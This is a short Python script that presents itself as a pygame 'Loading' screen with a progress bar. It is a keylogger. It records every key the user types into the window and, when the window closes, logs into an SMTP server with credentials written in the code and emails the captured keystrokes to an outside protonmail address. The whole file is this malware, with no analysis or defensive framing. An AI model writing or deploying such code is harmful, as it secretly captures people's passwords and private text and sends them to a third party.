import pygame
import sys
import smtplib

FROMADDR = "Blackhat_test@protonmail.ch"
TOADDR = "TheSanjok@protonmail.ch"
MSG = ''

red = (255, 0, 0)
x_val = 0
keys = []
key_string = ""

pygame.init()

arial = pygame.font.SysFont("comicsansms", 48)
text = arial.render("Loading", 1, red, None)
screen = pygame.display.set_mode((800, 600))

username = 'Blackhat_test@protonmail.ch'
password = 'test@123'

clock = pygame.time.Clock()

running = True

while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.KEYUP:
            name = pygame.key.name(event.key)
            if event.key == 13:
                key_string += '\n'
            elif event.key == 32:
                key_string += ' '
            else:
                key_string += name

            MSG = key_string
    clock.tick(60)

    pygame.draw.rect(screen, red, (0, 550, x_val, 20))
    x_val += 0.1
    screen.blit(text, (325, 100))
    #print(key_string)
    pygame.display.flip()

# The actual mail send
server = smtplib.SMTP('smtp.gmail.com:587')
server.starttls()
server.login(username,password)
server.sendmail(FROMADDR, TOADDR, MSG)
server.quit()
sys.exit()
